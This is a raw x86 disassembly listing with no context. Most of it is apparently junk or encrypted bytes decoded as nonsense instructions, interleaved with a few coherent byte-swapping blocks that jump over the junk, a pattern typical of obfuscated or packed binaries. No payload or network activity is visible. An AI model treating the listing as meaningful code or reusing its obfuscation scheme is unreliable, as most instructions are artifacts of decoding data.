  40c7e5:	jo     0x40c7c7
  40c7e7:	retf   0xfd17
  40c7ea:	gs leave 
  40c7ec:	xor    edi,DWORD PTR [esi+edx*1-0x63]
  40c7f0:	fisubr DWORD PTR [eax-0xe]
  40c7f3:	test   esi,ebx
  40c7f5:	xor    eax,0x3f27eb12
  40c7fa:	mov    ss,WORD PTR [edx+esi*4+0x77]
  40c7fe:	push   esp
  40c7ff:	dec    edx
  40c800:	in     al,0x6
  40c802:	cmp    DWORD PTR [edi-0x36],eax
  40c805:	clc    
  40c806:	ss push 0xfadf8d6e
  40c80c:	in     al,0xa1
  40c80e:	add    eax,0xb37e76ac
  40c813:	enter  0x12f3,0xe3
  40c817:	test   BYTE PTR [ebp+0x6dde94d],0x2a
  40c81e:	push   esp
  40c81f:	sbb    al,BYTE PTR [esi]
  40c821:	daa    
  40c822:	mov    al,0x15
  40c824:	xor    eax,0x6a89baf6
  40c829:	or     dh,dh
  40c82b:	or     BYTE PTR [edi],dl
  40c82d:	cld    
  40c82e:	cld    
  40c82f:	out    dx,al
  40c830:	leave  
  40c831:	ja     0x40c846
  40c833:	inc    ebp
  40c834:	mov    ah,0xe1
  40c836:	dec    eax
  40c838:	or     dh,ah
  40c83a:	aam    0xaa
  40c83c:	cli    
  40c83d:	sbb    eax,eax
  40c83f:	mov    edi,0x3a6aa61f
  40c844:	mov    esp,0xaacf9465
  40c849:	and    BYTE PTR [eax+0x45],bh
  40c84c:	js     0x40c863
  40c84e:	push   ds
  40c84f:	or     edx,DWORD PTR [ebx+0x4c]
  40c852:	shr    DWORD PTR [ebx],1
  40c854:	shl    BYTE PTR [edi-0x1e],0xf3
  40c858:	xor    al,0x91
  40c85a:	xchg   esi,eax
  40c85b:	lahf   
  40c85c:	pop    ss
  40c85d:	mov    ?,WORD PTR [edx]
  40c85f:	and    al,0x7b
  40c861:	xchg   DWORD PTR [ecx+ecx*2-0x1b],ebp
  40c865:	adc    al,0x88
  40c867:	or     bl,BYTE PTR [ebp+0x4951e33e]
  40c86d:	(bad)  
  40c86e:	out    0xae,al
  40c870:	mov    BYTE PTR [ecx+eiz*4+0x3d],al
  40c874:	inc    BYTE PTR [ebx-0x67]
  40c877:	gs ficom DWORD PTR es:[edx-0x277cf893]
  40c87f:	xor    dh,ch
  40c881:	mov    esp,0xf8ea1948
  40c886:	pop    ds
  40c887:	cdq    
  40c888:	inc    edx
  40c889:	clc    
  40c88a:	cmp    ecx,edx
  40c88c:	push   ebp
  40c88d:	adc    al,0xd0
  40c88f:	enter  0xd4b,0x8f
  40c893:	ss push eax
  40c895:	arpl   WORD PTR [edx+0x2110e343],sp
  40c89b:	push   edi
  40c89c:	dec    esp
  40c89d:	sub    ch,BYTE PTR [esi-0x1ca9cf19]
  40c8a3:	cmp    esi,DWORD PTR [esi-0x51c0268d]
  40c8a9:	pop    ss
  40c8aa:	std    
  40c8ab:	bound  edi,QWORD PTR [ebx+0x3]
  40c8ae:	mov    eax,ds:0xcd726823
  40c8b3:	jmp    0x1b38:0xee566a63
  40c8ba:	loop   0x40c904
  40c8bc:	sar    ecx,cl
  40c8be:	mov    edi,0xb947b1da
  40c8c3:	test   eax,0x1bbedd76
  40c8c8:	push   ss
  40c8c9:	aaa    
  40c8ca:	fnstcw WORD PTR [eax+0x14]
  40c8cd:	mov    ebp,DWORD PTR [edi]
  40c8cf:	in     eax,0x6c
  40c8d1:	mov    ch,0xb2
  40c8d3:	push   es
  40c8d4:	push   esi
  40c8d5:	xchg   esp,eax
  40c8d6:	data16 addr16 mov dl,0xcd
  40c8da:	jne    0x40c91a
  40c8dc:	mov    ch,0x87
  40c8de:	xchg   ebx,eax
  40c8df:	mov    ch,0xce
  40c8e1:	push   0xd0414fc7
  40c8e6:	jnp    0x40c93f
  40c8e8:	hlt    
  40c8e9:	jne    0x40c94b
  40c8eb:	and    al,0xc1
  40c8ed:	mov    bh,0x18
  40c8ef:	pop    edi
  40c8f0:	pop    ebx
  40c8f1:	mov    ebx,ecx
  40c8f3:	aad    0x96
  40c8f5:	inc    esi
  40c8f6:	icebp  
  40c8f7:	stos   BYTE PTR es:[edi],al
  40c8f8:	add    ebx,DWORD PTR [ebp+eax*8-0x72]
  40c8fc:	scas   eax,DWORD PTR es:[edi]
  40c8fd:	dec    ebx
  40c8fe:	int3   
  40c8ff:	scas   al,BYTE PTR es:[edi]
  40c900:	jge    0x40c8ee
  40c902:	int    0x9d
  40c904:	retf   
  40c905:	out    dx,eax
  40c906:	pop    ebp
  40c907:	or     ah,BYTE PTR [eax+0x1f875d1f]
  40c90d:	and    ah,BYTE PTR [eax+0x45]
  40c910:	cwde   
  40c911:	fs (bad) 
  40c913:	retf   
  40c914:	cmp    al,0xe5
  40c916:	bound  edx,QWORD PTR [eax+0x1c]
  40c919:	fistp  WORD PTR [eax+0xd]
  40c91c:	daa    
  40c91d:	pop    ds
  40c91e:	pop    eax
  40c91f:	cli    
  40c920:	inc    eax
  40c921:	adc    esp,esp
  40c923:	push   ebx
  40c924:	or     eax,0x744a1e6d
  40c929:	jecxz  0x40c937
  40c92b:	pop    esi
  40c92c:	in     al,0xe5
  40c92e:	inc    ecx
  40c92f:	mov    esp,0x6b47952a
  40c934:	or     dh,ah
  40c936:	call   0xc786:0x7ba094b8
  40c93d:	loope  0x40c920
  40c93f:	stc    
  40c940:	daa    
  40c941:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c942:	jg     0x40c983
  40c944:	add    DWORD PTR [ebx],0x7d8bec55
  40c94a:	in     al,0x8a
  40c94c:	xchg   esp,eax
  40c94d:	cmp    bl,BYTE PTR [ecx-0x77ffcd8e]
  40c953:	push   ebp
  40c954:	jnp    0xd074bdaf
  40c95a:	add    edx,DWORD PTR [ebp-0x14]
  40c95d:	mov    edi,DWORD PTR [ebp-0x1c]
  40c960:	mov    dl,BYTE PTR [edx+edi*1+0x327299]
  40c967:	mov    BYTE PTR [ebp+0xb],dl
  40c96a:	mov    dl,BYTE PTR [ebp+0xf]
  40c96d:	mov    edi,DWORD PTR [ebp-0xc]
  40c970:	xor    edi,eax
  40c972:	add    edi,DWORD PTR [ebp-0x14]
  40c975:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c978:	mov    BYTE PTR [edi+ebx*1+0x327299],dl
  40c97f:	mov    dl,BYTE PTR [ebp+0xb]
  40c982:	mov    edi,DWORD PTR [ebp-0x18]
  40c985:	xor    edi,eax
  40c987:	add    edi,DWORD PTR [ebp-0x14]
  40c98a:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c98d:	jmp    0x40cda4
  40c992:	and    ebx,DWORD PTR [eax]
  40c994:	mov    al,0x9c
  40c996:	mov    ebp,0xbca9239c
  40c99b:	jne    0x40c9bf
  40c99d:	pmovmskb edi,mm7
  40c9a0:	jno    0x40c987
  40c9a2:	retf   0x7e92
  40c9a5:	jle    0x40ca17
  40c9a7:	jns    0x40ca27
  40c9a9:	jle    0x40ca16
  40c9ab:	loope  0x40c96f
  40c9ad:	adc    ax,0xa60
  40c9b1:	enter  0x8d6c,0xad
  40c9b5:	bnd jae 0x40c998
  40c9b8:	xor    ecx,DWORD PTR [esi-0x3a]
  40c9bb:	mov    eax,0x183c5dfd
  40c9c0:	pop    edx
  40c9c1:	jnp    0x40c95a
  40c9c3:	mov    ecx,0x9b3824b0
  40c9c8:	push   esi
  40c9c9:	xchg   esp,eax
  40c9ca:	xor    al,0xa2
  40c9cc:	jge    0x40c9a4
  40c9ce:	adc    DWORD PTR [edi-0x60],edx
  40c9d1:	test   ch,bl
  40c9d3:	and    ah,ah
  40c9d5:	popf   
  40c9d6:	xor    dh,BYTE PTR [eax+ebx*2+0x35]
  40c9da:	dec    esp
  40c9db:	pop    esi
  40c9dc:	and    edx,DWORD PTR [ebx]
  40c9de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9df:	ret    0x2f56
  40c9e2:	adc    al,0xa9
  40c9e4:	cmp    DWORD PTR [esi+esi*1],0x1a8c6f90
  40c9eb:	call   0xd8e03fd
  40c9f0:	cli    
  40c9f1:	in     al,0x2f
  40c9f3:	inc    esi
  40c9f4:	loopne 0x40c983
  40c9f6:	lock inc ebp
  40c9f8:	arpl   WORD PTR [edx-0x49e6173d],dx
  40c9fe:	and    BYTE PTR [ecx+ebp*2+0x5ad63d68],al
  40ca05:	jecxz  0x40c9de
  40ca07:	mov    dh,0xfc
  40ca09:	imul   ebp,esi,0xffffffd0
  40ca0c:	enter  0xe94c,0x2f
  40ca10:	inc    ebp
  40ca11:	mov    ds:0xac18b5e7,eax
  40ca16:	nop
  40ca17:	into   
  40ca18:	(bad)  
  40ca19:	addr16 (bad) 
  40ca1c:	xchg   edi,eax
  40ca1d:	adc    BYTE PTR [ebx+0x4],ch
  40ca20:	sbb    eax,0xb87b2a47
  40ca25:	jecxz  0x40ca06
  40ca27:	mov    bl,0x3f
  40ca29:	ss jecxz 0x40ca48
  40ca2c:	aam    0x23
  40ca2e:	int3   
  40ca2f:	dec    esp
  40ca30:	pop    edx
  40ca31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca32:	mov    bh,0xd1
  40ca34:	ins    BYTE PTR es:[edi],dx
  40ca35:	mov    ebx,0x5375873
  40ca3a:	in     al,dx
  40ca3b:	jb     0x40c9df
  40ca3d:	stos   BYTE PTR es:[edi],al
  40ca3e:	jbe    0x40ca32
  40ca40:	adc    eax,0x859bf54a
  40ca45:	imul   ebp,DWORD PTR [eax],0x4f16f7a3
  40ca4b:	mov    ch,0xe3
  40ca4d:	sar    DWORD PTR [esp+ecx*1+0x50],1
  40ca51:	xchg   edx,eax
  40ca52:	sbb    al,0x71
  40ca54:	fidivr DWORD PTR [ecx]
  40ca56:	hlt    
  40ca57:	sub    edi,ebx
  40ca59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca5a:	mov    ds:0x5375101f,al
  40ca5f:	test   eax,0x4b006a39
  40ca64:	lods   eax,DWORD PTR ds:[esi]
  40ca65:	ret    0x72d0
  40ca68:	stos   DWORD PTR es:[edi],eax
  40ca69:	push   esi
  40ca6a:	repz inc edx
  40ca6c:	(bad)  
  40ca6d:	in     eax,dx
  40ca6e:	add    eax,0xf44e8458
  40ca73:	add    eax,0xb8981da3
  40ca78:	daa    
  40ca79:	mov    bl,0xf
  40ca7b:	clc    
  40ca7c:	sbb    edi,esi
  40ca7e:	lea    eax,[ebx-0x33fd5c1a]
  40ca84:	lea    ebp,[esi+0x3ca3fe71]
  40ca8a:	jg     0x40cac7
  40ca8c:	cmp    BYTE PTR [edx-0x2a],0xed
  40ca90:	sti    
  40ca91:	aad    0xa6
  40ca93:	jl     0x40ca2f
  40ca95:	test   al,0x93
  40ca97:	imul   edi,DWORD PTR [ecx+0x38],0x1f
  40ca9b:	or     eax,0x967b17e5
  40caa0:	xor    bh,BYTE PTR [ecx+0x51]
  40caa3:	sub    al,bl
  40caa5:	add    BYTE PTR [edi+0x1ded7ebf],ah
  40caab:	jmp    0x3f48:0xb8cb7cc6
  40cab2:	jnp    0x40cadd
  40cab4:	ins    BYTE PTR es:[edi],dx
  40cab5:	shl    DWORD PTR es:[edx],cl
  40cab8:	pop    esi
  40cab9:	cwde   
  40caba:	xor    al,0x59
  40cabc:	call   0x9904:0xfe9ed7eb
  40cac3:	mov    esi,?
  40cac5:	fmul   st(5),st
  40cac7:	cdq    
  40cac8:	out    dx,eax
  40cac9:	pop    ds
  40caca:	sub    eax,0xe66e02fb
  40cacf:	rep stos DWORD PTR es:[edi],eax
  40cad1:	pop    ebx
  40cad2:	stos   DWORD PTR es:[edi],eax
  40cad3:	add    DWORD PTR [ebp+0x3cd8d07d],edi
  40cad9:	or     eax,0xc59f08ca
  40cade:	xchg   ebp,eax
  40cadf:	pop    edx
  40cae0:	shr    ebp,cl
  40cae2:	and    DWORD PTR [ebx],0xffffff82
  40cae5:	test   eax,0x9de79450
  40caea:	or     edi,DWORD PTR [esi+0x29]
  40caed:	out    dx,eax
  40caee:	xchg   ebx,eax
  40caef:	sbb    ebx,DWORD PTR [ecx-0x76]
  40caf2:	and    al,0x8e
  40caf4:	fs cmc 
  40caf6:	adc    BYTE PTR [ebx-0x5f],al
  40caf9:	and    DWORD PTR [ebp-0x314f8a41],ecx
  40caff:	mov    edi,ecx
  40cb01:	dec    esi
  40cb02:	inc    edi
  40cb03:	mov    BYTE PTR [edx+0x72],dl
  40cb06:	add    eax,0xca91dde6
  40cb0b:	dec    edx
  40cb0c:	push   ebx
  40cb0d:	push   es
  40cb0e:	mov    ds:0xce1a1bf8,eax
  40cb13:	ja     0x40caad
  40cb15:	inc    ebp
  40cb16:	cli    
  40cb17:	sar    ecx,1
  40cb19:	sbb    ah,BYTE PTR [esi+0x8]
  40cb1c:	sbb    al,0xa0
  40cb1e:	push   ebx
  40cb1f:	fistp  WORD PTR [esi+0x31]
  40cb22:	das    
  40cb23:	scas   al,BYTE PTR es:[edi]
  40cb24:	enter  0x9a1e,0x5d
  40cb28:	data16 and al,0xc3
  40cb2b:	in     eax,0xbc
  40cb2d:	and    DWORD PTR cs:[ecx+0x9],esp
  40cb31:	sti    
  40cb32:	pusha  
  40cb33:	sbb    eax,0x58a6572c
  40cb38:	aam    0xd9
  40cb3a:	sub    DWORD PTR [edx+0x29],edx
  40cb3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb3e:	cwde   
  40cb3f:	call   0x6a88:0x8611cc89
  40cb46:	dec    esi
  40cb47:	add    DWORD PTR [edi-0x7f],edi
  40cb4a:	leave  
  40cb4b:	jb     0x40cb69
  40cb4d:	xchg   ebp,eax
  40cb4e:	dec    esp
  40cb4f:	push   ecx
  40cb50:	inc    ebp
  40cb51:	test   BYTE PTR [eax+0x353d2be8],cl
  40cb57:	push   esi
  40cb58:	adc    ebp,DWORD PTR [eax+edx*8-0x74]
  40cb5c:	out    dx,al
  40cb5d:	mov    ebx,0x7d69a81b
  40cb62:	or     dh,BYTE PTR [eax]
  40cb64:	sub    BYTE PTR [ecx],0x80
  40cb67:	sub    BYTE PTR [esi-0x63e0dd5c],bl
  40cb6d:	mov    fs,ebp
  40cb6f:	xchg   ecx,eax
  40cb70:	push   0x3d
  40cb72:	cmp    BYTE PTR [eax-0x3a],dl
  40cb75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb76:	push   0x1f
  40cb78:	adc    ebx,ecx
  40cb7a:	jp     0x40cb18
  40cb7c:	push   ecx
  40cb7d:	test   BYTE PTR [edx+0x35],0x60
  40cb81:	and    eax,0xd80ad976
  40cb86:	fisttp DWORD PTR [ebp+0x5d]
  40cb89:	mov    WORD PTR [ebp+0x51f6d24c],fs
  40cb8f:	cdq    
  40cb90:	out    0x69,eax
  40cb92:	sbb    al,0xca
  40cb94:	(bad)  
  40cb95:	nop
  40cb96:	jp     0x40cbc2
  40cb98:	icebp  
  40cb99:	lds    ebx,FWORD PTR [eax-0x77d01074]
  40cb9f:	and    eax,DWORD PTR [ebx]
  40cba1:	aam    0xb9
  40cba3:	inc    ebp
  40cba4:	mov    al,0x70
  40cba6:	mov    ecx,0xc088def8
  40cbab:	adc    al,0xec
  40cbad:	stos   BYTE PTR es:[edi],al
  40cbae:	sti    
  40cbaf:	inc    esi
  40cbb0:	adc    al,0xbe
  40cbb2:	cld    
  40cbb3:	and    al,0xa
  40cbb5:	mov    dl,0x53
  40cbb7:	aad    0x67
  40cbb9:	jmp    0xa7689785
  40cbbe:	pop    edi
  40cbbf:	imul   ebp,DWORD PTR [eax],0x8c1be9b9
  40cbc5:	add    dh,BYTE PTR [ebx+0xada3165]
  40cbcb:	stos   BYTE PTR es:[edi],al
  40cbcc:	in     al,dx
  40cbcd:	pop    es
  40cbce:	cmc    
  40cbcf:	mov    ds:0xd988fbe9,eax
  40cbd4:	cwde   
  40cbd5:	(bad)  
  40cbd6:	xchg   esp,eax
  40cbd7:	ret    
  40cbd8:	inc    ecx
  40cbd9:	inc    edx
  40cbda:	jae    0x40cb60
  40cbdc:	fidiv  DWORD PTR ss:[esi+eax*8+0x4918c57d]
  40cbe4:	jl     0x40cc57
  40cbe6:	jne    0x40cc26
  40cbe8:	mov    bl,0x66
  40cbea:	lds    ecx,FWORD PTR [ebx-0x21190ae]
  40cbf0:	or     al,0x4
  40cbf2:	add    DWORD PTR [esi+esi*2-0x7d306d5e],ebp
  40cbf9:	outs   dx,BYTE PTR ds:[esi]
  40cbfa:	add    dh,BYTE PTR [eax-0x54]
  40cbfd:	fsubr  DWORD PTR ds:0x9b6eb1fe
  40cc03:	iret   
  40cc04:	cmp    eax,ecx
  40cc06:	push   esi
  40cc07:	jae    0x40cbd3
  40cc09:	gs xchg ebp,eax
  40cc0b:	xchg   esi,eax
  40cc0c:	out    0xe7,al
  40cc0e:	sub    al,dl
  40cc10:	jb     0x40cc48
  40cc12:	pop    ds
  40cc13:	je     0x40cc3d
  40cc15:	inc    DWORD PTR [edi+0x3d47b5f0]
  40cc1b:	ins    DWORD PTR es:[edi],dx
  40cc1c:	or     cl,BYTE PTR [edi+0x4c3907a5]
  40cc22:	sbb    al,ah
  40cc24:	dec    ecx
  40cc25:	jp     0x40cc1d
  40cc27:	cmp    eax,0x91a886a8
  40cc2c:	jbe    0x40cc80
  40cc2e:	(bad)  
  40cc2f:	xor    BYTE PTR ds:0x9312559e,bh
  40cc35:	out    0x2b,eax
  40cc37:	add    BYTE PTR ds:0xdcbae8ac,dh
  40cc3d:	mov    ds:0x2b54ef96,al
  40cc42:	sub    BYTE PTR [ecx+0x48086b0a],ch
  40cc48:	fistp  QWORD PTR [ecx-0x917b1e1]
  40cc4e:	mov    BYTE PTR [edi+edx*8-0x43],al
  40cc52:	pop    ebx
  40cc53:	jl     0x40cc27
  40cc55:	test   DWORD PTR [ecx+0x17],ebx
  40cc58:	jb     0x40cc34
  40cc5a:	dec    ebx
  40cc5b:	mov    ebp,0x794ed098
  40cc60:	pushf  
  40cc61:	pop    esi
  40cc62:	xchg   esp,eax
  40cc63:	outs   dx,BYTE PTR ds:[esi]
  40cc64:	adc    DWORD PTR [ebp+0x247cdc67],edi
  40cc6a:	loop   0x40ccce
  40cc6c:	pop    esp
  40cc6d:	and    BYTE PTR [ecx],dl
  40cc6f:	xchg   ebx,eax
  40cc70:	(bad)  
  40cc71:	test   BYTE PTR [eax],ch
  40cc73:	adc    BYTE PTR [esi],0x78
  40cc76:	mov    ebp,0xccf77942
  40cc7b:	sbb    bl,al
  40cc7d:	xlat   BYTE PTR ds:[ebx]
  40cc7e:	and    cl,cl
  40cc80:	inc    ecx
  40cc81:	jp     0x40ccb8
  40cc83:	cli    
  40cc84:	scas   al,BYTE PTR es:[edi]
  40cc85:	inc    eax
  40cc86:	pop    eax
  40cc87:	(bad)
  40cc8a:	retf   0x1b42
  40cc8d:	cs ja  0x40cc9b
  40cc90:	shl    DWORD PTR [edi+0x5779ac89],0x20
  40cc97:	dec    esp
  40cc99:	xlat   BYTE PTR ds:[ebx]
  40cc9a:	repz sub BYTE PTR [ecx+0x3c9a92bf],bh
  40cca1:	pop    ebp
  40cca2:	pop    edx
  40cca3:	or     dh,BYTE PTR [ecx]
  40cca5:	stos   BYTE PTR es:[edi],al
  40cca6:	aad    0x58
  40cca8:	call   0xd664:0xb5e993a6
  40ccaf:	xor    DWORD PTR [edi+esi*8+0x56a18f19],edx
  40ccb6:	pusha  
  40ccb7:	setae  bl
  40ccba:	mov    ebp,0x405af276
  40ccbf:	fucomp st(5)
  40ccc1:	loop   0x40ccad
  40ccc3:	(bad)  
  40ccc4:	shl    BYTE PTR [edx],1
  40ccc6:	dec    edi
  40ccc7:	cmp    BYTE PTR [di],ch
  40ccca:	lea    ecx,[edx-0x6426e2eb]
  40ccd0:	(bad)  
  40ccd1:	xor    eax,0x3d1b8229
  40ccd6:	call   esi
  40ccd8:	arpl   WORD PTR [ecx-0x70a88cf2],bx
  40ccde:	mov    eax,ds:0x5195dd1
  40cce3:	iret   
  40cce4:	add    ecx,0x2a
  40cce7:	ins    DWORD PTR es:[edi],dx
  40cce8:	add    al,0x8f
  40ccea:	jmp    0xab56:0x87bf83b
  40ccf1:	sbb    al,0x6e
  40ccf3:	stc    
  40ccf4:	pop    es
  40ccf5:	xor    dh,bh
  40ccf7:	in     eax,0x71
  40ccf9:	sbb    eax,eax
  40ccfb:	or     ebp,DWORD PTR [edx-0x17]
  40ccfe:	add    al,0x11
  40cd00:	xchg   edx,eax
  40cd01:	lods   al,BYTE PTR ds:[esi]
  40cd02:	add    eax,0x28e43335
  40cd07:	or     al,0xfa
  40cd09:	xchg   esp,eax
  40cd0a:	mov    eax,ds:0x60d96c7
  40cd0f:	rcr    DWORD PTR [edi-0x76],0x8a
  40cd13:	outs   dx,BYTE PTR ds:[esi]
  40cd14:	test   DWORD PTR [ecx+0x13],edi
  40cd17:	lds    ecx,FWORD PTR [ebx]
  40cd19:	pop    edi
  40cd1a:	or     esi,0xfe9e19aa
  40cd20:	js     0x40ccd6
  40cd22:	pop    esp
  40cd23:	pop    eax
  40cd24:	mov    es,WORD PTR [ebp-0x42]
  40cd27:	scas   eax,DWORD PTR es:[edi]
  40cd28:	popa   
  40cd29:	xchg   esi,eax
  40cd2a:	or     al,0x7c
  40cd2c:	jp     0x40cd16
  40cd2e:	adc    al,0x62
  40cd30:	sub    eax,DWORD PTR [edi+0x50eca14b]
  40cd36:	test   bh,dl
  40cd38:	adc    DWORD PTR [esi+0x53],edx
  40cd3b:	fsubr  QWORD PTR [edi-0x56]
  40cd3e:	fwait
  40cd3f:	in     eax,dx
  40cd40:	adc    BYTE PTR [esi-0x35],bh
  40cd43:	adc    DWORD PTR [ebx+0x73],ecx
  40cd46:	push   ds
  40cd47:	push   ebp
  40cd48:	cdq    
  40cd49:	mov    es,WORD PTR [ebx]
  40cd4b:	(bad)  
  40cd4c:	or     eax,0x22bb3e06
  40cd51:	jb     0x40cda3
  40cd53:	or     DWORD PTR [edx-0x70d5df7a],ebx
  40cd59:	stos   DWORD PTR es:[edi],eax
  40cd5a:	in     eax,0xb4
  40cd5c:	mov    al,ds:0x4101ba76
  40cd61:	dec    DWORD PTR [eax-0x39]
  40cd64:	pop    esp
  40cd65:	and    al,0xb
  40cd67:	dec    edx
  40cd68:	fnstenv [eax-0xd]
  40cd6b:	mov    BYTE PTR [eax+edi*4-0x2618fcb],bl
  40cd72:	arpl   WORD PTR [ebx+0x11],di
  40cd75:	enter  0xfeec,0x31
  40cd79:	push   ebp
  40cd7a:	add    bh,al
  40cd7c:	mov    dh,BYTE PTR [ebx]
  40cd7e:	pusha  
  40cd7f:	stos   BYTE PTR es:[edi],al
  40cd80:	mov    al,0xf6
  40cd82:	(bad)
  40cd85:	mov    BYTE PTR [ecx-0x8],ch
  40cd88:	fsub   st,st(4)
  40cd8a:	shl    DWORD PTR [esi-0x72],1
  40cd8d:	les    edx,FWORD PTR [edi]
  40cd8f:	imul   edx,DWORD PTR [ebx],0x4
  40cd92:	dec    eax
  40cd93:	jno    0x40cd26
  40cd95:	sti    
  40cd96:	arpl   WORD PTR [ebx+0x58],bx
  40cd99:	rol    ebx,1
  40cd9b:	aas    
  40cd9c:	xchg   edi,eax
  40cd9d:	dec    edi
  40cd9e:	mov    edi,0x36a558b3
  40cda3:	pop    ebx
  40cda4:	mov    BYTE PTR [edi+ebx*1+0x327299],dl
  40cdab:	mov    edx,DWORD PTR [ebp-0x44]
  40cdae:	mov    edi,DWORD PTR [ebp-0xc]
  40cdb1:	xor    edx,eax
  40cdb3:	xor    edi,eax
  40cdb5:	add    edx,ecx
  40cdb7:	add    edi,ecx
  40cdb9:	imul   edx,edi
  40cdbc:	add    edx,DWORD PTR [ebp-0x14]
  40cdbf:	mov    DWORD PTR [ebp-0x14],edx
  40cdc2:	mov    edx,DWORD PTR [ebp-0xc]
  40cdc5:	mov    edi,DWORD PTR [ebp-0x24]
  40cdc8:	jmp    0x40d1df
  40cdcd:	push   ebp
  40cdce:	and    DWORD PTR [edx+esi*8],eax
  40cdd1:	jl     0x40cdc6
  40cdd3:	jge    0x40cd76
  40cdd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdd6:	sbb    esi,DWORD PTR [eax+0x58]
  40cdd9:	mov    dl,BYTE PTR [eax-0x54]
  40cddc:	or     ah,0x9e
  40cddf:	jle    0x40ce5f
  40cde1:	jo     0x40ce5c
  40cde3:	jle    0x40ce63
  40cde5:	pop    edx
  40cde6:	mov    DWORD PTR [edi],eax
  40cde8:	aas    
  40cde9:	fsubr  QWORD PTR [esi-0x1a8f8bfd]
  40cdef:	lahf   
  40cdf0:	pop    edx
  40cdf1:	stc    
  40cdf2:	xchg   edx,eax
  40cdf3:	xor    ch,0xce
  40cdf6:	paddsw mm7,QWORD PTR [esi-0x6c223d6d]
  40cdfd:	jno    0x40cd90
  40cdff:	ins    BYTE PTR es:[edi],dx
  40ce00:	mov    ds:0x60d4c010,eax
  40ce05:	por    mm3,mm0
  40ce08:	cmp    al,0x2c
  40ce0a:	pop    esi
  40ce0b:	and    DWORD PTR ds:[esi+0x1c],esp
  40ce0f:	add    eax,0x1de45322
  40ce14:	in     eax,0x33
  40ce16:	sbb    eax,0xd9b785da
  40ce1b:	sub    al,0x1b
  40ce1d:	(bad)  
  40ce1e:	push   cs
  40ce1f:	scas   eax,DWORD PTR es:[edi]
  40ce20:	mov    bh,BYTE PTR [eax]
  40ce22:	xchg   edx,eax
  40ce23:	(bad)  
  40ce24:	outs   dx,BYTE PTR ds:[esi]
  40ce25:	popf   
  40ce26:	inc    ecx
  40ce27:	hlt    
  40ce28:	lods   al,BYTE PTR ds:[esi]
  40ce29:	pop    edx
  40ce2a:	add    DWORD PTR [edi-0x6a3f4285],ebp
  40ce30:	add    ch,bl
  40ce32:	cld    
  40ce33:	pushf  
  40ce34:	jge    0x40ce72
  40ce36:	dec    ebx
  40ce37:	ja     0x40ce22
  40ce39:	push   eax
  40ce3a:	adc    eax,0x2ea8cb06
  40ce3f:	add    DWORD PTR [edi+0x397e2ab0],ecx
  40ce45:	sti    
  40ce46:	sub    al,0x91
  40ce48:	push   ds
  40ce49:	pushf  
  40ce4a:	mov    es,WORD PTR [edi-0x5e]
  40ce4d:	stc    
  40ce4e:	imul   ecx,DWORD PTR [esi],0x437e0bbd
  40ce54:	(bad)  
  40ce55:	popa   
  40ce56:	jecxz  0x40ce79
  40ce58:	fimul  WORD PTR [edx+0x1d35a7ab]
  40ce5e:	jp     0x40ce5a
  40ce60:	mov    ch,0xd3
  40ce62:	into   
  40ce63:	pop    ebp
  40ce64:	jb     0x40ce49
  40ce66:	or     eax,0x990f9249
  40ce6b:	fdivr  st,st(6)
  40ce6d:	mov    edx,0xcbe1daf3
  40ce72:	sub    BYTE PTR [eax+esi*2],al
  40ce75:	(bad)  
  40ce76:	push   ecx
  40ce78:	ins    DWORD PTR es:[edi],dx
  40ce79:	adc    al,0x2d
  40ce7b:	retf   0xc7ff
  40ce7e:	pop    ebp
  40ce7f:	xor    edx,eax
  40ce81:	cs call 0x693ca394
  40ce87:	out    0x74,al
  40ce89:	fs mov esi,0x4a771919
  40ce8f:	aaa    
  40ce90:	lods   eax,DWORD PTR ds:[esi]
  40ce91:	fcom   QWORD PTR [edx+0x35d0be52]
  40ce97:	lahf   
  40ce98:	icebp  
  40ce99:	dec    ecx
  40ce9a:	pop    edi
  40ce9b:	ficomp WORD PTR [ebx]
  40ce9d:	mov    al,0x5a
  40ce9f:	in     al,dx
  40cea0:	cmc    
  40cea1:	jno    0x40cee2
  40cea3:	popf   
  40cea4:	mov    edi,0x586b8479
  40cea9:	cli    
  40ceaa:	xchg   esp,eax
  40ceab:	sbb    ebp,DWORD PTR fs:[edx-0x67147ab4]
  40ceb2:	and    cl,BYTE PTR [ecx-0x1c]
  40ceb5:	push   esp
  40ceb6:	mov    dh,0xe
  40ceb8:	fwait
  40ceb9:	mov    bh,0x84
  40cebb:	sub    dh,BYTE PTR [edi]
  40cebd:	into   
  40cebe:	xchg   ecx,eax
  40cebf:	cmc    
  40cec0:	push   ss
  40cec1:	pop    edi
  40cec2:	rol    DWORD PTR [esi+esi*4],1
  40cec5:	cmp    edx,ebx
  40cec7:	mov    dl,0xb4
  40cec9:	jmp    0x540c4dc8
  40cece:	push   es
  40cecf:	enter  0x713c,0x6e
  40ced3:	adc    DWORD PTR [esi+0x5af49bdc],eax
  40ced9:	ret    
  40ceda:	mov    al,dh
  40cedc:	xchg   esp,eax
  40cedd:	enter  0x898e,0x41
  40cee1:	jge    0x40cf0e
  40cee3:	int    0xc3
  40cee5:	hlt    
  40cee6:	fwait
  40cee7:	xor    al,BYTE PTR [ecx+0x4d]
  40ceea:	pop    esi
  40ceeb:	and    eax,0xc901db69
  40cef0:	lds    edi,FWORD PTR [edx+0x1f]
  40cef3:	add    al,0xf1
  40cef5:	(bad)  
  40cef6:	or     DWORD PTR [edi+0x6e0d6bd3],edi
  40cefc:	jge    0x40ceb7
  40cefe:	(bad)  
  40ceff:	xor    esp,DWORD PTR [esi+0x3]
  40cf02:	pop    ebx
  40cf03:	adc    eax,esp
  40cf05:	scas   al,BYTE PTR es:[edi]
  40cf06:	mov    ebx,0x802f036a
  40cf0b:	cmp    ebp,DWORD PTR [bx+si]
  40cf0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf0f:	leave  
  40cf10:	adc    ebx,DWORD PTR ds:0x7c921869
  40cf16:	retf   0xdc1e
  40cf19:	les    ecx,FWORD PTR ds:0x8e08b8fe
  40cf1f:	aas    
  40cf20:	ja     0x40ceae
  40cf22:	jge    0x40cf7e
  40cf24:	xchg   edi,eax
  40cf25:	pop    ds
  40cf26:	int    0xe
